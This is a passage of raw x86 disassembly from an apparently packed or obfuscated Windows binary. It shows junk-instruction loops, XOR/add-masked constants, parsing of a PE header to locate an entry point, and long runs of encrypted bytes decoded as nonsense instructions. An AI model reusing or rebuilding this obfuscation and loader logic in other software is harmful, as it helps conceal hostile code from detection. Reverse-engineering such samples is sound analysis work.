  40624e:	outs   dx,BYTE PTR cs:[esi]
  406250:	ja     0x4062d1
  406252:	repz rcl DWORD PTR [edx],cl
  406255:	sub    BYTE PTR [edx-0x2eff0e2d],bh
  40625b:	rcl    bh,1
  40625d:	retf   0x9518
  406260:	aad    0xa4
  406262:	xor    eax,0x81f0339a
  406267:	and    eax,0x4338a3
  40626c:	add    BYTE PTR [eax],al
  40626e:	add    BYTE PTR [eax],al
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4338a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4338a3,ecx
  406282:	cmp    DWORD PTR ds:0x4338a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4338a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4338a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4338a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4338a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	jnp    0x4062b5
  406313:	jg     0x4062dc
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	dec    edx
  40631e:	xor    ah,BYTE PTR [ebx+edx*2+0x4ec3d664]
  406325:	repz inc esi
  406327:	lods   eax,DWORD PTR ds:[esi]
  406328:	nop
  406329:	xor    ah,BYTE PTR fs:[ebp-0x5c794b16]
  406330:	loop   0x406325
  406332:	imul   ebp,DWORD PTR [ebx-0x4e],0xffffffa6
  406336:	sub    al,0x53
  406338:	adc    al,dl
  40633a:	jmp    0x95af:0x6b303fdc
  406341:	scas   eax,DWORD PTR es:[edi]
  406342:	adc    dh,BYTE PTR [ebx-0x60]
  406345:	call   0xef50e52f
  40634a:	dec    esp
  40634b:	cmp    edi,DWORD PTR [ebx]
  40634d:	imul   esi,ebp,0xffffff93
  406350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406351:	xor    esp,edx
  406353:	jmp    0x8748bc33
  406358:	xchg   edx,eax
  406359:	sub    al,0x2
  40635b:	xchg   ebp,eax
  40635c:	sbb    ah,BYTE PTR [edx-0x709222fa]
  406362:	sbb    al,0x77
  406364:	imul   di,WORD PTR [eax-0x1f8df1e6],0xffc9
  40636c:	inc    edi
  40636d:	add    BYTE PTR [eax],al
  40636f:	shr    BYTE PTR es:[ebx+0x76],cl
  406373:	xor    dl,BYTE PTR [eax-0x7a]
  406376:	test   eax,0xe73d0f3
  40637b:	test   BYTE PTR [ecx+0x7e7ea4f9],al
  406381:	add    DWORD PTR [ebp+0x557fa7d7],0xffffffdd
  406388:	or     ecx,DWORD PTR [esi]
  40638a:	out    dx,al
  40638b:	les    esp,FWORD PTR [edx-0x16edc064]
  406391:	(bad)  
  406392:	inc    edx
  406393:	add    BYTE PTR [ebp-0x6af3f58c],dl
  406399:	xor    edx,DWORD PTR [esi+0x14]
  40639c:	xchg   esp,eax
  40639d:	das    
  40639e:	dec    esi
  40639f:	add    al,0x49
  4063a1:	test   al,0x8e
  4063a3:	adc    DWORD PTR [ecx],ebx
  4063a5:	aaa    
  4063a6:	sbb    cl,BYTE PTR [edx+0x7a]
  4063a9:	mov    ds:0xe42181a1,eax
  4063ae:	test   dl,0x8f
  4063b1:	and    DWORD PTR [ebp+edx*1+0x4e],esi
  4063b5:	xchg   ecx,eax
  4063b6:	cli    
  4063b7:	xacquire xchg DWORD PTR es:0xd648acc6,esp
  4063bf:	enter  0xa171,0xa0
  4063c3:	nop
  4063c4:	mov    ch,0xc3
  4063c6:	mov    ch,0xf4
  4063c8:	mov    eax,0x744fd247
  4063cd:	std    
  4063ce:	(bad)  
  4063cf:	jmp    0x2144e44c
  4063d4:	xchg   ecx,eax
  4063d5:	pop    eax
  4063d6:	mul    BYTE PTR [edx+esi*2-0x5f8d8e6d]
  4063dd:	stc    
  4063de:	dec    ecx
  4063df:	outs   dx,BYTE PTR ds:[esi]
  4063e0:	out    dx,al
  4063e1:	out    0x18,eax
  4063e3:	and    al,0x4a
  4063e5:	xchg   edi,eax
  4063e6:	imul   edx,DWORD PTR [ebx],0xffffffca
  4063e9:	push   eax
  4063ea:	repz xchg esp,eax
  4063ec:	aad    0x30
  4063ee:	mov    eax,0xe15d1201
  4063f3:	icebp  
  4063f4:	out    dx,eax
  4063f5:	jl     0x4063e8
  4063f7:	retf   
  4063f8:	not    DWORD PTR [ecx-0x63]
  4063fb:	jnp    0x406403
  4063fd:	push   cs
  4063fe:	in     eax,0x3e
  406400:	sub    BYTE PTR [edx+0xa],dh
  406403:	popf   
  406404:	enter  0xeaf3,0x28
  406408:	jmp    0x406485
  40640a:	add    eax,0xc293268
  40640f:	and    esi,edx
  406411:	(bad)  
  406412:	inc    edx
  406413:	mov    ebp,0x96963b54
  406418:	dec    esp
  406419:	ss xor al,0x64
  40641c:	(bad)
  40641f:	adc    eax,0x68ba7240
  406424:	xchg   DWORD PTR [eax+0x39],eax
  406427:	xor    al,0xfc
  406429:	add    DWORD PTR [edi+0x11],0xffffffa1
  40642d:	xchg   dh,dh
  40642f:	pop    esp
  406430:	sbb    DWORD PTR [eax+0x18],ebp
  406433:	jmp    0x8669:0x14f56262
  40643a:	dec    esi
  40643b:	jne    0x406453
  40643d:	lods   eax,DWORD PTR ds:[esi]
  40643e:	rcr    bl,1
  406440:	test   al,0x9e
  406442:	mov    eax,0xaad98302
  406447:	aas    
  406448:	sub    eax,0xfd27137f
  40644d:	xor    al,0x19
  40644f:	test   BYTE PTR [ecx+ecx*2-0x2013e651],cl
  406456:	fs cwde 
  406458:	inc    eax
  406459:	xor    cl,BYTE PTR [eax-0x2c]
  40645c:	fdiv   st,st(2)
  40645e:	arpl   di,di
  406460:	sbb    al,al
  406462:	inc    eax
  406463:	add    al,0xc6
  406465:	mov    ah,bl
  406467:	nop
  406468:	and    DWORD PTR [ebx-0x23],ebx
  40646b:	cli    
  40646c:	sbb    BYTE PTR [ebx],0xec
  40646f:	out    0x61,eax
  406471:	cmp    eax,0x65c716cd
  406476:	mov    ebp,0xbe0edf5c
  40647b:	daa    
  40647c:	jne    0xe48f4810
  406482:	cmp    ah,0xfc
  406485:	hlt    
  406486:	ror    DWORD PTR [edx],cl
  406488:	mov    dl,0xef
  40648a:	jge    0x406504
  40648c:	fwait
  40648d:	xchg   BYTE PTR [ebp-0x7c],bl
  406490:	add    bh,BYTE PTR [ebx-0x40ccd1e4]
  406496:	add    DWORD PTR [ebx-0x54],0x65
  40649a:	mov    al,0x97
  40649c:	call   0x28072b71
  4064a1:	les    ecx,FWORD PTR [di+0x2c]
  4064a5:	xchg   ebx,eax
  4064a6:	push   edx
  4064a7:	fisttp WORD PTR ds:0x94a5317e
  4064ad:	adc    dh,bl
  4064af:	sub    ah,BYTE PTR [esi+0x6b56a6ca]
  4064b5:	test   al,0x19
  4064b7:	add    bl,bh
  4064b9:	inc    edi
  4064ba:	outs   dx,BYTE PTR ds:[esi]
  4064bb:	scas   eax,DWORD PTR es:[edi]
  4064bc:	jae    0x4064ab
  4064be:	enter  0x54a1,0xbf
  4064c2:	and    ebp,ebp
  4064c4:	dec    esp
  4064c5:	mov    ds:0xb0d64b8f,eax
  4064ca:	jge    0x4064a4
  4064cc:	xchg   BYTE PTR [eax-0x3f],ah
  4064cf:	lahf   
  4064d0:	sub    BYTE PTR [ebx+ebp*4+0x580af51a],bl
  4064d7:	cmp    al,dh
  4064d9:	xor    ebp,esp
  4064db:	mov    edi,0xc6ed2044
  4064e0:	iret   
  4064e1:	adc    ecx,DWORD PTR [eax+0x6922131f]
  4064e7:	jo     0x40653a
  4064e9:	adc    bl,cl
  4064eb:	sub    BYTE PTR [ecx],bh
  4064ed:	xchg   esp,eax
  4064ee:	aam    0xe7
  4064f0:	sahf   
  4064f1:	fbld   TBYTE PTR [edx+0x10]
  4064f4:	inc    ebx
  4064f5:	and    BYTE PTR [ecx+0x4743319f],cl
  4064fb:	xchg   ecx,eax
  4064fc:	xchg   ecx,eax
  4064fd:	popa   
  4064fe:	xchg   DWORD PTR [eax-0x38cb64cd],esp
  406504:	std    
  406505:	xor    bl,dh
  406507:	fmulp  st(4),st
  406509:	imul   esi,DWORD PTR es:[ecx-0x46f8c826],0xffffffa7
  406511:	mov    ebp,0xed1c2a3d
  406516:	xchg   esp,eax
  406517:	pop    es
  406518:	sti    
  406519:	mov    dh,0x1d
  40651b:	popf   
  40651c:	xchg   edx,eax
  40651d:	cmp    al,0x6c
  40651f:	sahf   
  406520:	sub    al,0x67
  406522:	loop   0x406562
  406524:	test   eax,0x340b69d2
  406529:	test   BYTE PTR [edx+0x29],0xb7
  40652d:	xor    al,0x38
  40652f:	mov    DWORD PTR [edi+0x3c],edx
  406532:	bnd jns 0x40654f
  406535:	retf   
  406536:	xor    esp,ebp
  406538:	mov    al,0x33
  40653a:	pop    esi
  40653b:	pop    es
  40653c:	and    edx,ecx
  40653e:	ficomp DWORD PTR [ebx]
  406540:	pop    ebx
  406541:	scas   eax,DWORD PTR es:[edi]
  406542:	cs sti 
  406544:	dec    edi
  406545:	outs   dx,DWORD PTR ds:[esi]
  406546:	mov    ds:0xab4d6685,eax
  40654b:	push   0xd98b6069
  406550:	jmp    0xd872924b
  406555:	(bad)  
  406556:	fstp   st(0)
  406558:	pusha  
  406559:	aas    
  40655a:	sbb    dh,BYTE PTR [ecx]
  40655c:	inc    esi
  40655d:	mov    ch,0xd1
  40655f:	mov    edi,DWORD PTR [ecx+0x95fb69b]
  406565:	and    eax,ebx
  406567:	cwde   
  406568:	jo     0x40651b
  40656a:	clc    
  40656b:	push   cs
  40656c:	test   al,0x32
  40656e:	add    ah,dl
  406570:	mov    DWORD PTR cs:[esi],ebp
  406573:	int3   
  406574:	leave  
  406575:	add    esp,ecx
  406577:	je     0x4065b5
  406579:	push   ebx
  40657a:	jns    0x4065a0
  40657c:	js     0x406545
  40657e:	pop    esi
  40657f:	inc    esi
  406580:	dec    ebx
  406581:	jae    0x406551
  406583:	cmp    al,0xde
  406585:	fwait
  406586:	add    dh,BYTE PTR [esi-0x5e6c18d8]
  40658c:	js     0x4065b9
  40658e:	test   al,0xab
  406590:	(bad)  
  406591:	iret   
  406592:	in     eax,0x6a
  406594:	lods   al,BYTE PTR ds:[esi]
  406595:	mov    esp,0x6c6eb8f7
  40659a:	jmp    0xf483beb3
  40659f:	sub    al,0xbb
  4065a1:	jb     0x4065fc
  4065a3:	mov    edi,0xaef5b1c2
  4065a8:	outs   dx,DWORD PTR ds:[esi]
  4065a9:	xchg   ebp,eax
  4065aa:	daa    
  4065ab:	int3   
  4065ac:	cli    
  4065ad:	lds    ecx,FWORD PTR ss:[ebp+0x21]
  4065b1:	outs   dx,BYTE PTR ds:[esi]
  4065b2:	icebp  
  4065b3:	les    eax,FWORD PTR [ecx]
  4065b5:	hlt    
  4065b6:	out    dx,al
  4065b7:	mov    cl,0x3f
  4065b9:	xlat   BYTE PTR ds:[ebx]
  4065ba:	mov    ch,0xc2
  4065bc:	inc    edi
  4065bd:	mov    edx,0x1fd2d0c3
  4065c2:	icebp  
  4065c3:	cmp    al,0xa
  4065c5:	inc    ecx
  4065c6:	add    cl,BYTE PTR [eax]
  4065c8:	mov    al,0xbd
  4065ca:	cld    
  4065cb:	clc    
  4065cc:	enter  0x6c8d,0x89
  4065d0:	pop    esp
  4065d1:	bnd jae 0x4065e2
  4065d4:	jmp    0xe7a0:0xc9720e6e
  4065db:	lds    esp,FWORD PTR [ecx]
  4065dd:	pop    ds
  4065de:	outs   dx,DWORD PTR ds:[esi]
  4065df:	test   BYTE PTR [esi+eiz*2],ch
  4065e2:	test   DWORD PTR [eax-0x62e7a5db],eax
  4065e8:	and    DWORD PTR [edx+0x7d7d1d9b],esi
  4065ee:	(bad)  
  4065ef:	and    ch,dl
  4065f1:	pushf  
  4065f2:	mov    BYTE PTR [edi-0x651e8c17],bl
  4065f8:	cmp    esi,DWORD PTR [edx+0x7c20697b]
  4065fe:	fst    DWORD PTR [ebx+0xcd0f23]
  406604:	pop    eax
  406605:	stc    
  406606:	in     al,dx
  406607:	aad    0x7f
  406609:	out    0x78,eax
  40660b:	cmp    eax,0x98af6d8c
  406610:	jmp    0x406635
  406612:	pop    ds
  406613:	sbb    eax,0xfd5351eb
  406618:	sar    DWORD PTR [edi-0x44ca32a5],1
  40661e:	add    DWORD PTR [ebx-0x69],esi
  406621:	sub    eax,0xb9cac92e
  406626:	lock mov edi,0x2d84201
  40662c:	adc    ebp,DWORD PTR [ecx-0xec457fb]
  406632:	scas   al,BYTE PTR es:[edi]
  406633:	fld    TBYTE PTR [edi-0x25cd2212]
  406639:	and    ebx,DWORD PTR [edx]
  40663b:	pop    eax
  40663c:	mov    fs,esp
  40663e:	dec    edi
  40663f:	neg    DWORD PTR [eax+eiz*1+0x3b57bdc]
  406646:	ins    BYTE PTR es:[edi],dx
  406647:	in     eax,dx
  406648:	push   0x2f
  40664a:	test   BYTE PTR [esi+eax*8-0x2f008e33],bh
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43377b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433853,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433827,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433863,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433863
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433863,ecx
  4066d8:	cmp    DWORD PTR ds:0x433863,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433983
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433863,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433863
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433863,ecx
  406714:	cmp    DWORD PTR ds:0x433863,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433857
  406728:	and    ecx,DWORD PTR ds:0x43378f
  40672e:	mov    DWORD PTR ds:0x433857,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43379b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4338ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433793,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4337eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433787,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433787
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433787,ebx
  40677d:	cmp    DWORD PTR ds:0x433787,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433787,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4339b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43382b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433817,0x433827
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433853
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4337eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433793,0x43381f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433787,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43382f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433863
  40683c:	and    DWORD PTR ds:0x433827,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4338ab
  40684d:	or     DWORD PTR ds:0x433863,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4337db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43389f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43382b
  406870:	sub    DWORD PTR ds:0x433853,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43378b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433787,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433793,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43378f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4337a3,0x4338ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43381b,0x43385f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433867,0x433813
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4337d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4337db,0x43386f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43382b,0x4337ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4337db,0x43381b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43377b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43377b,0x4337a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43385b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43377f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43386f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43389b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43389b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43389b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43389b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43389b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433817
  4069db:	adc    ecx,DWORD PTR ds:0x4337df
  4069e1:	mov    DWORD PTR ds:0x433817,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433813,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4337e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433813,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43378f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43381b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43379b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433853,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xf1bd095f
  406b85:	jp     0x406b89
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0x67e7e7f
  406b8f:	js     0x406b3d
  406b91:	push   edx
  406b92:	or     al,0x2
  406b94:	push   esp
  406b95:	and    esp,edx
  406b97:	test   dh,dl
  406b99:	lock mov ah,0x2c
  406b9c:	xchg   ecx,eax
  406b9d:	mov    al,ds:0xf1549e3
  406ba2:	sub    DWORD PTR [esi+ebx*1+0x2ae341d9],edi
  406ba9:	jmp    0xbfc5b995
  406bae:	or     BYTE PTR [ebx+eiz*8],al
  406bb1:	mov    esi,0x81f79526
  406bb6:	mov    WORD PTR [eax],gs
  406bb8:	fwait
  406bb9:	jb     0x406b5f
  406bbb:	test   ebp,esp
  406bbd:	aad    0x2f
  406bbf:	rcl    DWORD PTR ds:0x16074d4,cl
  406bc5:	jg     0x406b9f
  406bc7:	dec    esp
  406bc8:	lahf   
  406bc9:	pop    ebp
  406bca:	xor    DWORD PTR [ecx+0x1e],ecx
  406bcd:	retf   
  406bce:	jmp    0x406c24
  406bd0:	mov    DWORD PTR [esi],esi
  406bd2:	mov    bh,0x3c
  406bd4:	sub    esi,ebx
  406bd6:	jae    0x406bdb
  406bd8:	fdivr  QWORD PTR [ebx]
  406bda:	test   BYTE PTR [ebp-0x6e],cl
  406bdd:	lea    ebp,[ecx+eiz*1]
  406be0:	fstp   st(2)
  406be2:	in     al,0x49
  406be4:	(bad)  
  406be7:	scas   eax,DWORD PTR es:[edi]
  406be8:	rol    DWORD PTR [esi],1
  406bea:	lahf   
  406beb:	iret   
  406bec:	mov    cl,0x51
  406bee:	lahf   
  406bef:	push   0xffffffd6
  406bf1:	jmp    0x4da25945
  406bf6:	clc    
  406bf7:	jne    0x406c5f
  406bf9:	sti    
  406bfa:	cmp    dh,al
  406bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bfd:	or     BYTE PTR [ebx],ch
  406bff:	lods   eax,DWORD PTR ds:[esi]
  406c00:	and    DWORD PTR [ebx],esp
  406c02:	fidiv  WORD PTR ds:0x3f25fed1
  406c08:	cmp    DWORD PTR [eax+0x260a0669],ebx
  406c0e:	sar    DWORD PTR [edi+0x12],0x86
  406c12:	xchg   DWORD PTR [esi+0x2a],edx
  406c15:	fwait
  406c16:	xor    dh,BYTE PTR [esi-0x6a896c8]
  406c1c:	mov    ebp,0x379c2a17
  406c21:	mov    edx,0xdaed6926
